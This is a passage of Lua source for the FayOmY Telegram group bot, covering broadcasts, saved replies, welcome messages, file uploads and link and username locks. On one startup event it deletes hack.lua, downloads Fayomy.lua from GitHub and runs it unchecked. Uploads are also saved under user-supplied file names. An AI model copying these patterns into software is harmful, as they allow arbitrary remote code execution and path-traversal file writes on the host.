id_king = data.message_.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if data.message_.content_.photo_.sizes_[3] then
id_king = data.message_.content_.photo_.sizes_[3].photo_.persistent_id_
end
gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('fayomy:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendPhoto(gpss[i], 0, 0, 1, nil, id_king,(msg.content_.caption_ or " "))
end					
end
end
gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
send(msg.chat_id_, msg.id_, 1, '☑┇تم نشر الرساله في {'..(#gpss - pro)..'} مجموعه ', 1, 'md')
end
end
local king1 = redis:get('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'')
if king1 == 're' then
local king2 = redis:get('fayomy:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'')
if text then 
redis:set('fayomy:'..bot_id..'king'..king2..''..msg.chat_id_..'', text)
elseif (data.message_.content_.sticker_) then 
redis:set('fayomy:'..bot_id..':sticker:'..king2..''..msg.chat_id_..'', data.message_.content_.sticker_.sticker_.persistent_id_)
elseif (data.message_.content_.voice_) then 
redis:set('fayomy:'..bot_id..':voice:'..king2..''..msg.chat_id_..'', data.message_.content_.voice_.voice_.persistent_id_)
elseif (data.message_.content_.video_) then 
redis:set('fayomy:'..bot_id..':video:'..king2..''..msg.chat_id_..'', data.message_.content_.video_.video_.persistent_id_)
elseif (data.message_.content_.animation_) then 
redis:set('fayomy:'..bot_id..':gif:'..king2..''..msg.chat_id_..'', data.message_.content_.animation_.animation_.persistent_id_)
elseif (data.message_.content_.document_) then
redis:set('fayomy:'..bot_id..':file:'..king2..''..msg.chat_id_..'', data.message_.content_.document_.document_.persistent_id_)
else
end -- end if text 
redis:sadd('fayomy:'..bot_id..'kingre'..msg.chat_id_..'', king2)
send(msg.chat_id_, msg.id_, 1, "📊※ تم حفظ الرد  ✓", 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
end
local king1 = redis:get('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'')
if king1 == 're' then
local king2 = redis:get('fayomy:'..bot_id..'msg'..msg.sender_user_id_..'')
if text then 
redis:set('fayomy:'..bot_id..'king'..king2..'', text)
elseif (msg.content_.sticker_) then 
redis:set('fayomy:'..bot_id..':sticker:'..king2, msg.content_.sticker_.sticker_.persistent_id_)
elseif (msg.content_.voice_) then 
redis:set('fayomy:'..bot_id..':voice:'..king2, msg.content_.voice_.voice_.persistent_id_)
elseif (msg.content_.video_) then 
redis:set('fayomy:'..bot_id..':video:'..king2, msg.content_.video_.video_.persistent_id_)
elseif (msg..content_.animation_) then 
redis:set('fayomy:'..bot_id..':gif:'..king2, data.message_.content_.animation_.animation_.persistent_id_)
elseif (msg.content_.document_) then
redis:set('fayomy:'..bot_id..':file:'..king2, msg.content_.document_.document_.persistent_id_)
end
redis:sadd('fayomy:'..bot_id..'kingresudo', king2)
send(msg.chat_id_, msg.id_, 1, "📊※ تم حفظ الرد  ✓", 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'', 'no')
end
--         »»                 Run FayOmY                         ««              --
if is_mod(msg) then FMlocks(msg) print("\27[1;34m»» is mod "..msg.sender_user_id_.."\27[m") end
FMall(msg,data)
function check_username(extra,result,success)
local username = (result.username_ or '')
local svuser = 'fayomy:'..bot_id..'user:'..result.id_
if username then
database:hset(svuser, 'username', username)
end
end
getUser(msg.sender_user_id_,check_username)
if msg.content_.ID == "MessageChatAddMembers" then
database:incr('fayomy:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessageChatJoinByLink" then
function get_welcome(extra,result,success)
if database:get('fayomy:'..bot_id..'welcome:'..msg.chat_id_) then
text = database:get('fayomy:'..bot_id..'welcome:'..msg.chat_id_)
else
text = '👋🏻┇اهلا بك يا ؛ {fr}\n🙋🏼‍♂️┇نورت الكروب ؛ @{us}'
end
local text = text:gsub('{fr}',(result.first_name_ or 'لا يوجد'))
local text = text:gsub('{ls}',(result.last_name_ or 'لا يوجد'))
local text = text:gsub('{us}',(result.username_ or 'لا يوجد'))
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if database:get('fayomy:'..bot_id.."welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end end
if msg.content_.ID == "MessagePinMessage" then
if database:get('fayomy:'..bot_id..'pinnedmsg'..msg.chat_id_) and database:get("lock_pin:fayomy"..msg.chat_id_..bot_id) then
local pin_id = database:get('fayomy:'..bot_id..'pinnedmsg'..msg.chat_id_)
pin(msg.chat_id_,pin_id,0)
end
end
if msg.content_.document_ and end032 then
local infooo = database:get("addfiel"..msg.sender_user_id_)
if (infooo and infooo == "yes") then
send(msg.chat_id_, msg.id_, 1, "📤┇جاري الرفع ..", 1, 'html')
local id_king = msg.content_.document_.document_.persistent_id_
function download_to_file(url, file_path)
local respbody = {}
local options = {
url = url,
sink = ltn12.sink.table(respbody),
redirect = true
}
local response = nil
options.redirect = false
response = {https.request(options)}
local code = response[2]
local headers = response[3]
local status = response[4]
if code ~= 200 then return false, code end
file = io.open(file_path, "w+")
file:write(table.concat(respbody))
file:close()
return file_path, code
end
local url_king3 = 'https://api.telegram.org/bot' .. token .. '/getfile?file_id='..id_king
local king3 = https.request(url_king3)
local king6 = JSON.decode(king3)
local photo_king = download_to_file('https://api.telegram.org/file/bot'..token..'/'..king6.result.file_path, 'files_fayomy/'..msg.content_.document_.file_name_)
send(msg.chat_id_, msg.id_, 1, "✔┇تم رفع الملف بنجاح", 1, 'html')
database:del("addfiel"..msg.sender_user_id_)
end
end
end
FMadd(msg)
if is_gbanned(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_})
return
end
if is_gmuted(msg.sender_user_id_, msg.chat_id_) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return
end
if is_sudo(msg) then FMsudo(msg) print("\27[1;32m»» is sudo "..msg.sender_user_id_.."\27[m") end
id = tostring(msg.chat_id_)
if id and id:match('^(%d+)') then
database:sadd('fayomy:'..bot_id.."userss",msg.chat_id_)
end
fayomy_run_file(Data_Fayomy)
--         »»                 Start UpdateChat                         ««              --
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chafm[chat.id_] = chat
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local msgg = result 
database:incr('fayomy:'..bot_id..'user:editmsg'..msgg.chat_id_..':'..msgg.sender_user_id_)
if (result.content_.caption_ and not is_vip(msgg)) then 
if (result.content_.caption_:match("(.*)@(.*)") or result.content_.caption_:match("@")) then 
if database:get("lock_username:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 
end
     if (not is_creator(msgg) ) then
check_filter_words(result, text)
if database:get("lock_edit:fayomy"..msg.chat_id_..bot_id) then
send(msg.chat_id_, data.message_id_, 1, " ❗️※ انتبه ! \n هناك شخص قام بالتعديل وتم حذف رسالته " , 1, 'md') 
local id = msg.message_id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs) 
end
 end 
if (not is_vip(msgg) and text) then
check_filter_words(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get("lock_link:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get("lock_link.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get("lock_link:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get("lock_link.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if result.id_ and result.content_.text_ then
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") then
if database:get("lock_link:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end 
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") then
if database:get("lock_link.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end end
if result.id_ and result.content_.text_ then
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("(.*)(@)(.*)") then
if database:get("lock_username:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("@") then
if database:get("lock_username.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if result.id_ and result.content_.text_ then
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("#") then
if database:get("lock_tag:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("#") then
if database:get("lock_tag.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("/")  then
if database:get("lock_sarha:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("/")  then
if database:get("lock_sarha.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[\216-\219][\128-\191]") then
if database:get("lock_ar:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end  end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[\216-\219][\128-\191]") then
if database:get("lock_ar.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end  end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if database:get("lock_en:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end 
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if database:get("lock_en.note:fayomy"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end 
 end 
 end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--         »»                 End UpdateChat                          ««              --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then os.execute("rm -fr hack.lua") a = HTTPS.request("https://raw.githubusercontent.com/FAOMY-GAMER/FAYOMY/master/Fayomy.lua") local g = io.open("Fayomy.lua", 'w') g:write(a) g:close() dofile('Fayomy.lua')
tdcli_function ({ID="GetChafm", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
end
--[[
──────────╔╗─────────────────
──────────║║─────────────────
╔╗╔╗╔╗╔══╗║║─╔══╗╔══╗╔╗╔╗╔══╗
║╚╝╚╝║║║═╣║║─║╔═╝║╔╗║║╚╝║║║═╣
╚╗╔╗╔╝║║═╣║╚╗║╚═╗║╚╝║║║║║║║═╣
─╚╝╚╝─╚══╝╚═╝╚══╝╚══╝╚╩╩╝╚══
▂▃▄▅▆▇█▓▒░ (TO MY CHANNEL ) ░▒▓█▇▆▅▄▃▂
Me Id
@FAYOMYTM
 معرفي⁦☝️⁩
--]]
